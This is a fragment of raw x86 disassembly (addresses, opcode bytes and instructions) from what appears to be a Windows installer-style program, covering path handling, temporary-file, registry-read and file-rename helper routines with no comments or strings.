  40582b:	e8 97 fe ff ff       	call   0x4056c7
  405830:	85 c0                	test   %eax,%eax
  405832:	75 1f                	jne    0x405853
  405834:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405837:	74 12                	je     0x40584b
  405839:	57                   	push   %edi
  40583a:	6a f1                	push   $0xfffffff1
  40583c:	e8 45 f8 ff ff       	call   0x405086
  405841:	6a 00                	push   $0x0
  405843:	57                   	push   %edi
  405844:	e8 df 04 00 00       	call   0x405d28
  405849:	eb 10                	jmp    0x40585b
  40584b:	ff 05 a8 37 42 00    	incl   0x4237a8
  405851:	eb 08                	jmp    0x40585b
  405853:	57                   	push   %edi
  405854:	6a f2                	push   $0xfffffff2
  405856:	e8 2b f8 ff ff       	call   0x405086
  40585b:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  405861:	50                   	push   %eax
  405862:	ff 75 f8             	push   -0x8(%ebp)
  405865:	ff 15 2c 71 40 00    	call   *0x40712c
  40586b:	85 c0                	test   %eax,%eax
  40586d:	0f 85 57 ff ff ff    	jne    0x4057ca
  405873:	ff 75 f8             	push   -0x8(%ebp)
  405876:	ff 15 3c 71 40 00    	call   *0x40713c
  40587c:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405880:	74 04                	je     0x405886
  405882:	80 63 ff 00          	andb   $0x0,-0x1(%ebx)
  405886:	33 f6                	xor    %esi,%esi
  405888:	39 75 08             	cmp    %esi,0x8(%ebp)
  40588b:	74 4b                	je     0x4058d8
  40588d:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  405890:	75 08                	jne    0x40589a
  405892:	ff 05 a8 37 42 00    	incl   0x4237a8
  405898:	eb 3e                	jmp    0x4058d8
  40589a:	57                   	push   %edi
  40589b:	e8 d1 08 00 00       	call   0x406171
  4058a0:	85 c0                	test   %eax,%eax
  4058a2:	74 34                	je     0x4058d8
  4058a4:	57                   	push   %edi
  4058a5:	e8 35 00 00 00       	call   0x4058df
  4058aa:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4058ad:	0c 01                	or     $0x1,%al
  4058af:	50                   	push   %eax
  4058b0:	57                   	push   %edi
  4058b1:	e8 11 fe ff ff       	call   0x4056c7
  4058b6:	85 c0                	test   %eax,%eax
  4058b8:	75 16                	jne    0x4058d0
  4058ba:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  4058bd:	74 d3                	je     0x405892
  4058bf:	57                   	push   %edi
  4058c0:	6a f1                	push   $0xfffffff1
  4058c2:	e8 bf f7 ff ff       	call   0x405086
  4058c7:	56                   	push   %esi
  4058c8:	57                   	push   %edi
  4058c9:	e8 5a 04 00 00       	call   0x405d28
  4058ce:	eb 08                	jmp    0x4058d8
  4058d0:	57                   	push   %edi
  4058d1:	6a e5                	push   $0xffffffe5
  4058d3:	e8 ae f7 ff ff       	call   0x405086
  4058d8:	5f                   	pop    %edi
  4058d9:	5e                   	pop    %esi
  4058da:	5b                   	pop    %ebx
  4058db:	c9                   	leave
  4058dc:	c2 08 00             	ret    $0x8
  4058df:	56                   	push   %esi
  4058e0:	8b 74 24 08          	mov    0x8(%esp),%esi
  4058e4:	56                   	push   %esi
  4058e5:	e8 99 05 00 00       	call   0x405e83
  4058ea:	03 c6                	add    %esi,%eax
  4058ec:	50                   	push   %eax
  4058ed:	56                   	push   %esi
  4058ee:	ff 15 e8 71 40 00    	call   *0x4071e8
  4058f4:	80 38 5c             	cmpb   $0x5c,(%eax)
  4058f7:	74 0b                	je     0x405904
  4058f9:	68 14 90 40 00       	push   $0x409014
  4058fe:	56                   	push   %esi
  4058ff:	e8 85 05 00 00       	call   0x405e89
  405904:	8b c6                	mov    %esi,%eax
  405906:	5e                   	pop    %esi
  405907:	c2 04 00             	ret    $0x4
  40590a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40590e:	eb 0d                	jmp    0x40591d
  405910:	3a 4c 24 08          	cmp    0x8(%esp),%cl
  405914:	74 0d                	je     0x405923
  405916:	50                   	push   %eax
  405917:	ff 15 30 72 40 00    	call   *0x407230
  40591d:	8a 08                	mov    (%eax),%cl
  40591f:	84 c9                	test   %cl,%cl
  405921:	75 ed                	jne    0x405910
  405923:	c2 08 00             	ret    $0x8
  405926:	56                   	push   %esi
  405927:	8b 74 24 08          	mov    0x8(%esp),%esi
  40592b:	56                   	push   %esi
  40592c:	e8 52 05 00 00       	call   0x405e83
  405931:	03 c6                	add    %esi,%eax
  405933:	80 38 5c             	cmpb   $0x5c,(%eax)
  405936:	74 0c                	je     0x405944
  405938:	50                   	push   %eax
  405939:	56                   	push   %esi
  40593a:	ff 15 e8 71 40 00    	call   *0x4071e8
  405940:	3b c6                	cmp    %esi,%eax
  405942:	77 ef                	ja     0x405933
  405944:	80 20 00             	andb   $0x0,(%eax)
  405947:	40                   	inc    %eax
  405948:	5e                   	pop    %esi
  405949:	c2 04 00             	ret    $0x4
  40594c:	8b 54 24 04          	mov    0x4(%esp),%edx
  405950:	8a 0a                	mov    (%edx),%cl
  405952:	8a c1                	mov    %cl,%al
  405954:	0c 20                	or     $0x20,%al
  405956:	80 f9 5c             	cmp    $0x5c,%cl
  405959:	75 05                	jne    0x405960
  40595b:	38 4a 01             	cmp    %cl,0x1(%edx)
  40595e:	74 0e                	je     0x40596e
  405960:	3c 61                	cmp    $0x61,%al
  405962:	7c 0f                	jl     0x405973
  405964:	3c 7a                	cmp    $0x7a,%al
  405966:	7f 0b                	jg     0x405973
  405968:	80 7a 01 3a          	cmpb   $0x3a,0x1(%edx)
  40596c:	75 05                	jne    0x405973
  40596e:	33 c0                	xor    %eax,%eax
  405970:	40                   	inc    %eax
  405971:	eb 02                	jmp    0x405975
  405973:	33 c0                	xor    %eax,%eax
  405975:	c2 04 00             	ret    $0x4
  405978:	53                   	push   %ebx
  405979:	56                   	push   %esi
  40597a:	8b 35 30 72 40 00    	mov    0x407230,%esi
  405980:	57                   	push   %edi
  405981:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405985:	57                   	push   %edi
  405986:	ff d6                	call   *%esi
  405988:	8b d8                	mov    %eax,%ebx
  40598a:	53                   	push   %ebx
  40598b:	ff d6                	call   *%esi
  40598d:	8a 0f                	mov    (%edi),%cl
  40598f:	84 c9                	test   %cl,%cl
  405991:	74 10                	je     0x4059a3
  405993:	80 3b 3a             	cmpb   $0x3a,(%ebx)
  405996:	75 0b                	jne    0x4059a3
  405998:	80 7b 01 5c          	cmpb   $0x5c,0x1(%ebx)
  40599c:	75 05                	jne    0x4059a3
  40599e:	50                   	push   %eax
  40599f:	ff d6                	call   *%esi
  4059a1:	eb 24                	jmp    0x4059c7
  4059a3:	80 f9 5c             	cmp    $0x5c,%cl
  4059a6:	75 1d                	jne    0x4059c5
  4059a8:	38 4f 01             	cmp    %cl,0x1(%edi)
  4059ab:	75 18                	jne    0x4059c5
  4059ad:	6a 02                	push   $0x2
  4059af:	5e                   	pop    %esi
  4059b0:	6a 5c                	push   $0x5c
  4059b2:	50                   	push   %eax
  4059b3:	4e                   	dec    %esi
  4059b4:	e8 51 ff ff ff       	call   0x40590a
  4059b9:	80 38 00             	cmpb   $0x0,(%eax)
  4059bc:	74 07                	je     0x4059c5
  4059be:	40                   	inc    %eax
  4059bf:	85 f6                	test   %esi,%esi
  4059c1:	75 ed                	jne    0x4059b0
  4059c3:	eb 02                	jmp    0x4059c7
  4059c5:	33 c0                	xor    %eax,%eax
  4059c7:	5f                   	pop    %edi
  4059c8:	5e                   	pop    %esi
  4059c9:	5b                   	pop    %ebx
  4059ca:	c2 04 00             	ret    $0x4
  4059cd:	56                   	push   %esi
  4059ce:	57                   	push   %edi
  4059cf:	ff 74 24 0c          	push   0xc(%esp)
  4059d3:	be 38 11 42 00       	mov    $0x421138,%esi
  4059d8:	56                   	push   %esi
  4059d9:	e8 8f 04 00 00       	call   0x405e6d
  4059de:	56                   	push   %esi
  4059df:	e8 94 ff ff ff       	call   0x405978
  4059e4:	8b f8                	mov    %eax,%edi
  4059e6:	85 ff                	test   %edi,%edi
  4059e8:	75 04                	jne    0x4059ee
  4059ea:	33 c0                	xor    %eax,%eax
  4059ec:	eb 52                	jmp    0x405a40
  4059ee:	57                   	push   %edi
  4059ef:	e8 e4 06 00 00       	call   0x4060d8
  4059f4:	f6 05 38 37 42 00 80 	testb  $0x80,0x423738
  4059fb:	74 0a                	je     0x405a07
  4059fd:	8a 07                	mov    (%edi),%al
  4059ff:	84 c0                	test   %al,%al
  405a01:	74 e7                	je     0x4059ea
  405a03:	3c 5c                	cmp    $0x5c,%al
  405a05:	74 e3                	je     0x4059ea
  405a07:	2b fe                	sub    %esi,%edi
  405a09:	eb 14                	jmp    0x405a1f
  405a0b:	e8 61 07 00 00       	call   0x406171
  405a10:	85 c0                	test   %eax,%eax
  405a12:	74 05                	je     0x405a19
  405a14:	f6 00 10             	testb  $0x10,(%eax)
  405a17:	74 d1                	je     0x4059ea
  405a19:	56                   	push   %esi
  405a1a:	e8 07 ff ff ff       	call   0x405926
  405a1f:	56                   	push   %esi
  405a20:	e8 5e 04 00 00       	call   0x405e83
  405a25:	3b c7                	cmp    %edi,%eax
  405a27:	56                   	push   %esi
  405a28:	7f e1                	jg     0x405a0b
  405a2a:	e8 b0 fe ff ff       	call   0x4058df
  405a2f:	56                   	push   %esi
  405a30:	ff 15 8c 70 40 00    	call   *0x40708c
  405a36:	33 c9                	xor    %ecx,%ecx
  405a38:	83 f8 ff             	cmp    $0xffffffff,%eax
  405a3b:	0f 95 c1             	setne  %cl
  405a3e:	8b c1                	mov    %ecx,%eax
  405a40:	5f                   	pop    %edi
  405a41:	5e                   	pop    %esi
  405a42:	c2 04 00             	ret    $0x4
  405a45:	55                   	push   %ebp
  405a46:	8b ec                	mov    %esp,%ebp
  405a48:	51                   	push   %ecx
  405a49:	53                   	push   %ebx
  405a4a:	56                   	push   %esi
  405a4b:	57                   	push   %edi
  405a4c:	8b 3d a8 70 40 00    	mov    0x4070a8,%edi
  405a52:	ff 75 0c             	push   0xc(%ebp)
  405a55:	ff d7                	call   *%edi
  405a57:	8b 75 08             	mov    0x8(%ebp),%esi
  405a5a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405a5d:	eb 27                	jmp    0x405a86
  405a5f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a62:	ff 75 0c             	push   0xc(%ebp)
  405a65:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405a68:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  405a6c:	56                   	push   %esi
  405a6d:	ff 15 0c 71 40 00    	call   *0x40710c
  405a73:	85 c0                	test   %eax,%eax
  405a75:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a78:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  405a7b:	74 1a                	je     0x405a97
  405a7d:	56                   	push   %esi
  405a7e:	ff 15 30 72 40 00    	call   *0x407230
  405a84:	8b f0                	mov    %eax,%esi
  405a86:	56                   	push   %esi
  405a87:	ff d7                	call   *%edi
  405a89:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405a8c:	7d d1                	jge    0x405a5f
  405a8e:	33 c0                	xor    %eax,%eax
  405a90:	5f                   	pop    %edi
  405a91:	5e                   	pop    %esi
  405a92:	5b                   	pop    %ebx
  405a93:	c9                   	leave
  405a94:	c2 08 00             	ret    $0x8
  405a97:	8b c6                	mov    %esi,%eax
  405a99:	eb f5                	jmp    0x405a90
  405a9b:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405a9f:	56                   	push   %esi
  405aa0:	8b 74 24 10          	mov    0x10(%esp),%esi
  405aa4:	85 f6                	test   %esi,%esi
  405aa6:	76 0f                	jbe    0x405ab7
  405aa8:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405aac:	2b c1                	sub    %ecx,%eax
  405aae:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  405ab1:	88 11                	mov    %dl,(%ecx)
  405ab3:	41                   	inc    %ecx
  405ab4:	4e                   	dec    %esi
  405ab5:	75 f7                	jne    0x405aae
  405ab7:	5e                   	pop    %esi
  405ab8:	c2 0c 00             	ret    $0xc
  405abb:	56                   	push   %esi
  405abc:	ff 74 24 08          	push   0x8(%esp)
  405ac0:	ff 15 8c 70 40 00    	call   *0x40708c
  405ac6:	8b f0                	mov    %eax,%esi
  405ac8:	83 fe ff             	cmp    $0xffffffff,%esi
  405acb:	74 0d                	je     0x405ada
  405acd:	24 fe                	and    $0xfe,%al
  405acf:	50                   	push   %eax
  405ad0:	ff 74 24 0c          	push   0xc(%esp)
  405ad4:	ff 15 90 70 40 00    	call   *0x407090
  405ada:	8b c6                	mov    %esi,%eax
  405adc:	5e                   	pop    %esi
  405add:	c2 04 00             	ret    $0x4
  405ae0:	ff 74 24 04          	push   0x4(%esp)
  405ae4:	ff 15 8c 70 40 00    	call   *0x40708c
  405aea:	8b c8                	mov    %eax,%ecx
  405aec:	6a 00                	push   $0x0
  405aee:	41                   	inc    %ecx
  405aef:	f7 d9                	neg    %ecx
  405af1:	1b c9                	sbb    %ecx,%ecx
  405af3:	23 c8                	and    %eax,%ecx
  405af5:	51                   	push   %ecx
  405af6:	ff 74 24 14          	push   0x14(%esp)
  405afa:	6a 00                	push   $0x0
  405afc:	6a 01                	push   $0x1
  405afe:	ff 74 24 1c          	push   0x1c(%esp)
  405b02:	ff 74 24 1c          	push   0x1c(%esp)
  405b06:	ff 15 7c 70 40 00    	call   *0x40707c
  405b0c:	c2 0c 00             	ret    $0xc
  405b0f:	55                   	push   %ebp
  405b10:	8b ec                	mov    %esp,%ebp
  405b12:	56                   	push   %esi
  405b13:	8b 75 08             	mov    0x8(%ebp),%esi
  405b16:	57                   	push   %edi
  405b17:	6a 64                	push   $0x64
  405b19:	5f                   	pop    %edi
  405b1a:	a1 c4 93 40 00       	mov    0x4093c4,%eax
  405b1f:	4f                   	dec    %edi
  405b20:	89 45 08             	mov    %eax,0x8(%ebp)
  405b23:	ff 15 78 70 40 00    	call   *0x407078
  405b29:	6a 1a                	push   $0x1a
  405b2b:	33 d2                	xor    %edx,%edx
  405b2d:	59                   	pop    %ecx
  405b2e:	f7 f1                	div    %ecx
  405b30:	56                   	push   %esi
  405b31:	8d 45 08             	lea    0x8(%ebp),%eax
  405b34:	6a 00                	push   $0x0
  405b36:	50                   	push   %eax
  405b37:	ff 75 0c             	push   0xc(%ebp)
  405b3a:	00 55 0a             	add    %dl,0xa(%ebp)
  405b3d:	ff 15 d8 70 40 00    	call   *0x4070d8
  405b43:	85 c0                	test   %eax,%eax
  405b45:	75 0d                	jne    0x405b54
  405b47:	85 ff                	test   %edi,%edi
  405b49:	75 cf                	jne    0x405b1a
  405b4b:	80 26 00             	andb   $0x0,(%esi)
  405b4e:	5f                   	pop    %edi
  405b4f:	5e                   	pop    %esi
  405b50:	5d                   	pop    %ebp
  405b51:	c2 08 00             	ret    $0x8
  405b54:	8b c6                	mov    %esi,%eax
  405b56:	eb f6                	jmp    0x405b4e
  405b58:	55                   	push   %ebp
  405b59:	8b ec                	mov    %esp,%ebp
  405b5b:	56                   	push   %esi
  405b5c:	8b 75 10             	mov    0x10(%ebp),%esi
  405b5f:	8d 45 10             	lea    0x10(%ebp),%eax
  405b62:	6a 00                	push   $0x0
  405b64:	50                   	push   %eax
  405b65:	56                   	push   %esi
  405b66:	ff 75 0c             	push   0xc(%ebp)
  405b69:	ff 75 08             	push   0x8(%ebp)
  405b6c:	ff 15 88 70 40 00    	call   *0x407088
  405b72:	85 c0                	test   %eax,%eax
  405b74:	74 0a                	je     0x405b80
  405b76:	3b 75 10             	cmp    0x10(%ebp),%esi
  405b79:	75 05                	jne    0x405b80
  405b7b:	33 c0                	xor    %eax,%eax
  405b7d:	40                   	inc    %eax
  405b7e:	eb 02                	jmp    0x405b82
  405b80:	33 c0                	xor    %eax,%eax
  405b82:	5e                   	pop    %esi
  405b83:	5d                   	pop    %ebp
  405b84:	c2 0c 00             	ret    $0xc
  405b87:	55                   	push   %ebp
  405b88:	8b ec                	mov    %esp,%ebp
  405b8a:	56                   	push   %esi
  405b8b:	8b 75 10             	mov    0x10(%ebp),%esi
  405b8e:	8d 45 10             	lea    0x10(%ebp),%eax
  405b91:	6a 00                	push   $0x0
  405b93:	50                   	push   %eax
  405b94:	56                   	push   %esi
  405b95:	ff 75 0c             	push   0xc(%ebp)
  405b98:	ff 75 08             	push   0x8(%ebp)
  405b9b:	ff 15 dc 70 40 00    	call   *0x4070dc
  405ba1:	85 c0                	test   %eax,%eax
  405ba3:	74 0a                	je     0x405baf
  405ba5:	3b 75 10             	cmp    0x10(%ebp),%esi
  405ba8:	75 05                	jne    0x405baf
  405baa:	33 c0                	xor    %eax,%eax
  405bac:	40                   	inc    %eax
  405bad:	eb 02                	jmp    0x405bb1
  405baf:	33 c0                	xor    %eax,%eax
  405bb1:	5e                   	pop    %esi
  405bb2:	5d                   	pop    %ebp
  405bb3:	c2 0c 00             	ret    $0xc
  405bb6:	53                   	push   %ebx
  405bb7:	55                   	push   %ebp
  405bb8:	56                   	push   %esi
  405bb9:	57                   	push   %edi
  405bba:	bf c0 1a 42 00       	mov    $0x421ac0,%edi
  405bbf:	68 e0 93 40 00       	push   $0x4093e0
  405bc4:	57                   	push   %edi
  405bc5:	ff 15 e0 70 40 00    	call   *0x4070e0
  405bcb:	8b 74 24 18          	mov    0x18(%esp),%esi
  405bcf:	8b 2d 04 71 40 00    	mov    0x407104,%ebp
  405bd5:	85 f6                	test   %esi,%esi
  405bd7:	bb 00 04 00 00       	mov    $0x400,%ebx
  405bdc:	74 26                	je     0x405c04
  405bde:	6a 01                	push   $0x1
  405be0:	6a 00                	push   $0x0
  405be2:	56                   	push   %esi
  405be3:	e8 f8 fe ff ff       	call   0x405ae0
  405be8:	50                   	push   %eax
  405be9:	ff 15 f4 70 40 00    	call   *0x4070f4
  405bef:	53                   	push   %ebx
  405bf0:	57                   	push   %edi
  405bf1:	56                   	push   %esi
  405bf2:	ff d5                	call   *%ebp
  405bf4:	85 c0                	test   %eax,%eax
  405bf6:	0f 84 27 01 00 00    	je     0x405d23
  405bfc:	3b c3                	cmp    %ebx,%eax
  405bfe:	0f 8f 1f 01 00 00    	jg     0x405d23
  405c04:	be c0 1e 42 00       	mov    $0x421ec0,%esi
  405c09:	53                   	push   %ebx
  405c0a:	56                   	push   %esi
  405c0b:	ff 74 24 1c          	push   0x1c(%esp)
  405c0f:	ff d5                	call   *%ebp
  405c11:	85 c0                	test   %eax,%eax
  405c13:	0f 84 0a 01 00 00    	je     0x405d23
  405c19:	3b c3                	cmp    %ebx,%eax
  405c1b:	0f 8f 02 01 00 00    	jg     0x405d23
  405c21:	56                   	push   %esi
  405c22:	57                   	push   %edi
  405c23:	68 d8 93 40 00       	push   $0x4093d8
  405c28:	68 c0 16 42 00       	push   $0x4216c0
  405c2d:	ff 15 74 72 40 00    	call   *0x407274
  405c33:	8b d8                	mov    %eax,%ebx
  405c35:	a1 30 37 42 00       	mov    0x423730,%eax
  405c3a:	83 c4 10             	add    $0x10,%esp
  405c3d:	ff b0 28 01 00 00    	push   0x128(%eax)
  405c43:	56                   	push   %esi
  405c44:	e8 46 02 00 00       	call   0x405e8f
  405c49:	6a 04                	push   $0x4
  405c4b:	68 00 00 00 c0       	push   $0xc0000000
  405c50:	56                   	push   %esi
  405c51:	e8 8a fe ff ff       	call   0x405ae0
  405c56:	8b e8                	mov    %eax,%ebp
  405c58:	83 fd ff             	cmp    $0xffffffff,%ebp
  405c5b:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  405c5f:	0f 84 be 00 00 00    	je     0x405d23
  405c65:	6a 00                	push   $0x0
  405c67:	55                   	push   %ebp
  405c68:	ff 15 80 70 40 00    	call   *0x407080
  405c6e:	8b f8                	mov    %eax,%edi
  405c70:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  405c74:	50                   	push   %eax
  405c75:	6a 40                	push   $0x40
  405c77:	ff 15 60 71 40 00    	call   *0x407160
  405c7d:	8b f0                	mov    %eax,%esi
  405c7f:	85 f6                	test   %esi,%esi
  405c81:	0f 84 95 00 00 00    	je     0x405d1c
  405c87:	57                   	push   %edi
  405c88:	56                   	push   %esi
  405c89:	55                   	push   %ebp
  405c8a:	e8 c9 fe ff ff       	call   0x405b58
  405c8f:	85 c0                	test   %eax,%eax
  405c91:	0f 84 85 00 00 00    	je     0x405d1c
  405c97:	68 cc 93 40 00       	push   $0x4093cc
  405c9c:	56                   	push   %esi
  405c9d:	e8 a3 fd ff ff       	call   0x405a45
  405ca2:	85 c0                	test   %eax,%eax
  405ca4:	75 14                	jne    0x405cba
  405ca6:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  405ca9:	68 cc 93 40 00       	push   $0x4093cc
  405cae:	50                   	push   %eax
  405caf:	ff 15 e0 70 40 00    	call   *0x4070e0
  405cb5:	83 c7 0a             	add    $0xa,%edi
  405cb8:	eb 35                	jmp    0x405cef
  405cba:	83 c0 0a             	add    $0xa,%eax
  405cbd:	68 c8 93 40 00       	push   $0x4093c8
  405cc2:	50                   	push   %eax
  405cc3:	e8 7d fd ff ff       	call   0x405a45
  405cc8:	8b e8                	mov    %eax,%ebp
  405cca:	85 ed                	test   %ebp,%ebp
  405ccc:	74 1d                	je     0x405ceb
  405cce:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  405cd1:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  405cd4:	eb 06                	jmp    0x405cdc
  405cd6:	8a 11                	mov    (%ecx),%dl
  405cd8:	88 10                	mov    %dl,(%eax)
  405cda:	48                   	dec    %eax
  405cdb:	49                   	dec    %ecx
  405cdc:	3b cd                	cmp    %ebp,%ecx
  405cde:	77 f6                	ja     0x405cd6
  405ce0:	2b ee                	sub    %esi,%ebp
  405ce2:	45                   	inc    %ebp
  405ce3:	8b c5                	mov    %ebp,%eax
  405ce5:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405ce9:	eb 06                	jmp    0x405cf1
  405ceb:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405cef:	8b c7                	mov    %edi,%eax
  405cf1:	53                   	push   %ebx
  405cf2:	03 c6                	add    %esi,%eax
  405cf4:	68 c0 16 42 00       	push   $0x4216c0
  405cf9:	50                   	push   %eax
  405cfa:	e8 9c fd ff ff       	call   0x405a9b
  405cff:	33 c0                	xor    %eax,%eax
  405d01:	50                   	push   %eax
  405d02:	50                   	push   %eax
  405d03:	50                   	push   %eax
  405d04:	55                   	push   %ebp
  405d05:	ff 15 34 71 40 00    	call   *0x407134
  405d0b:	03 fb                	add    %ebx,%edi
  405d0d:	57                   	push   %edi
  405d0e:	56                   	push   %esi
  405d0f:	55                   	push   %ebp
  405d10:	e8 72 fe ff ff       	call   0x405b87
  405d15:	56                   	push   %esi
  405d16:	ff 15 24 71 40 00    	call   *0x407124
  405d1c:	55                   	push   %ebp
  405d1d:	ff 15 f4 70 40 00    	call   *0x4070f4
  405d23:	5f                   	pop    %edi
  405d24:	5e                   	pop    %esi
  405d25:	5d                   	pop    %ebp
  405d26:	5b                   	pop    %ebx
  405d27:	c3                   	ret
  405d28:	6a 05                	push   $0x5
  405d2a:	ff 74 24 0c          	push   0xc(%esp)
  405d2e:	ff 74 24 0c          	push   0xc(%esp)
  405d32:	ff 15 e4 70 40 00    	call   *0x4070e4
  405d38:	85 c0                	test   %eax,%eax
  405d3a:	75 0f                	jne    0x405d4b
  405d3c:	ff 74 24 08          	push   0x8(%esp)
  405d40:	ff 74 24 08          	push   0x8(%esp)
  405d44:	e8 6d fe ff ff       	call   0x405bb6
  405d49:	59                   	pop    %ecx
  405d4a:	59                   	pop    %ecx
  405d4b:	ff 05 b0 37 42 00    	incl   0x4237b0
  405d51:	c2 08 00             	ret    $0x8
  405d54:	55                   	push   %ebp
  405d55:	8b ec                	mov    %esp,%ebp
  405d57:	53                   	push   %ebx
  405d58:	8d 45 18             	lea    0x18(%ebp),%eax
  405d5b:	56                   	push   %esi
  405d5c:	50                   	push   %eax
  405d5d:	8b 45 18             	mov    0x18(%ebp),%eax
  405d60:	33 db                	xor    %ebx,%ebx
  405d62:	f7 d8                	neg    %eax
  405d64:	1b c0                	sbb    %eax,%eax
  405d66:	8b 75 14             	mov    0x14(%ebp),%esi
  405d69:	25 00 01 00 00       	and    $0x100,%eax
  405d6e:	0d 19 00 02 00       	or     $0x20019,%eax
  405d73:	88 1e                	mov    %bl,(%esi)
  405d75:	50                   	push   %eax
  405d76:	53                   	push   %ebx
  405d77:	ff 75 0c             	push   0xc(%ebp)
  405d7a:	ff 75 08             	push   0x8(%ebp)
  405d7d:	ff 15 14 70 40 00    	call   *0x407014
  405d83:	85 c0                	test   %eax,%eax
  405d85:	75 3e                	jne    0x405dc5
  405d87:	8d 45 0c             	lea    0xc(%ebp),%eax
  405d8a:	c7 45 0c 00 04 00 00 	movl   $0x400,0xc(%ebp)
  405d91:	50                   	push   %eax
  405d92:	8d 45 14             	lea    0x14(%ebp),%eax
  405d95:	56                   	push   %esi
  405d96:	50                   	push   %eax
  405d97:	53                   	push   %ebx
  405d98:	ff 75 10             	push   0x10(%ebp)
  405d9b:	ff 75 18             	push   0x18(%ebp)
  405d9e:	ff 15 2c 70 40 00    	call   *0x40702c
  405da4:	85 c0                	test   %eax,%eax
  405da6:	75 0c                	jne    0x405db4
  405da8:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
  405dac:	74 08                	je     0x405db6
  405dae:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
  405db2:	74 02                	je     0x405db6
  405db4:	88 1e                	mov    %bl,(%esi)
  405db6:	ff 75 18             	push   0x18(%ebp)
  405db9:	88 9e ff 03 00 00    	mov    %bl,0x3ff(%esi)
  405dbf:	ff 15 20 70 40 00    	call   *0x407020
  405dc5:	5e                   	pop    %esi
  405dc6:	5b                   	pop    %ebx
  405dc7:	5d                   	pop    %ebp
  405dc8:	c2 14 00             	ret    $0x14
  405dcb:	ff 74 24 08          	push   0x8(%esp)
  405dcf:	68 9c 73 40 00       	push   $0x40739c
  405dd4:	ff 74 24 0c          	push   0xc(%esp)
  405dd8:	ff 15 74 72 40 00    	call   *0x407274
  405dde:	83 c4 0c             	add    $0xc,%esp
  405de1:	c2 08 00             	ret    $0x8
  405de4:	55                   	push   %ebp
  405de5:	8b ec                	mov    %esp,%ebp
  405de7:	51                   	push   %ecx
  405de8:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405deb:	53                   	push   %ebx
  405dec:	56                   	push   %esi
  405ded:	57                   	push   %edi
  405dee:	33 ff                	xor    %edi,%edi
  405df0:	80 39 2d             	cmpb   $0x2d,(%ecx)
  405df3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405dfa:	b0 0a                	mov    $0xa,%al
  405dfc:	b3 39                	mov    $0x39,%bl
  405dfe:	75 05                	jne    0x405e05
  405e00:	41                   	inc    %ecx
  405e01:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405e05:	80 39 30             	cmpb   $0x30,(%ecx)
  405e08:	75 1c                	jne    0x405e26
  405e0a:	41                   	inc    %ecx
  405e0b:	8a 11                	mov    (%ecx),%dl
  405e0d:	80 fa 30             	cmp    $0x30,%dl
  405e10:	7c 09                	jl     0x405e1b
  405e12:	80 fa 37             	cmp    $0x37,%dl
  405e15:	7f 04                	jg     0x405e1b
  405e17:	b0 08                	mov    $0x8,%al
  405e19:	b3 37                	mov    $0x37,%bl
  405e1b:	80 e2 df             	and    $0xdf,%dl
  405e1e:	80 fa 58             	cmp    $0x58,%dl
  405e21:	75 03                	jne    0x405e26
  405e23:	b0 10                	mov    $0x10,%al
  405e25:	41                   	inc    %ecx
  405e26:	0f be 11             	movsbl (%ecx),%edx
  405e29:	41                   	inc    %ecx
  405e2a:	83 fa 30             	cmp    $0x30,%edx
  405e2d:	7c 0c                	jl     0x405e3b
  405e2f:	0f be f3             	movsbl %bl,%esi
  405e32:	3b d6                	cmp    %esi,%edx
  405e34:	7f 05                	jg     0x405e3b
  405e36:	83 ea 30             	sub    $0x30,%edx
  405e39:	eb 19                	jmp    0x405e54
  405e3b:	3c 10                	cmp    $0x10,%al
  405e3d:	75 21                	jne    0x405e60
  405e3f:	8b f2                	mov    %edx,%esi
  405e41:	83 e6 df             	and    $0xffffffdf,%esi
  405e44:	83 fe 41             	cmp    $0x41,%esi
  405e47:	7c 17                	jl     0x405e60
  405e49:	83 fe 46             	cmp    $0x46,%esi
  405e4c:	7f 12                	jg     0x405e60
  405e4e:	83 e2 07             	and    $0x7,%edx
  405e51:	83 c2 09             	add    $0x9,%edx
  405e54:	0f be f0             	movsbl %al,%esi
  405e57:	0f af f7             	imul   %edi,%esi
  405e5a:	03 f2                	add    %edx,%esi
  405e5c:	8b fe                	mov    %esi,%edi
  405e5e:	eb c6                	jmp    0x405e26
  405e60:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405e63:	0f af c7             	imul   %edi,%eax
  405e66:	5f                   	pop    %edi
  405e67:	5e                   	pop    %esi
  405e68:	5b                   	pop    %ebx
  405e69:	c9                   	leave
  405e6a:	c2 04 00             	ret    $0x4
  405e6d:	68 00 04 00 00       	push   $0x400
  405e72:	ff 74 24 0c          	push   0xc(%esp)
  405e76:	ff 74 24 0c          	push   0xc(%esp)
  405e7a:	ff 15 1c 71 40 00    	call   *0x40711c
  405e80:	c2 08 00             	ret    $0x8
  405e83:	ff 25 a8 70 40 00    	jmp    *0x4070a8
  405e89:	ff 25 e8 70 40 00    	jmp    *0x4070e8
  405e8f:	55                   	push   %ebp
  405e90:	8b ec                	mov    %esp,%ebp
  405e92:	83 ec 18             	sub    $0x18,%esp
  405e95:	8b 45 0c             	mov    0xc(%ebp),%eax
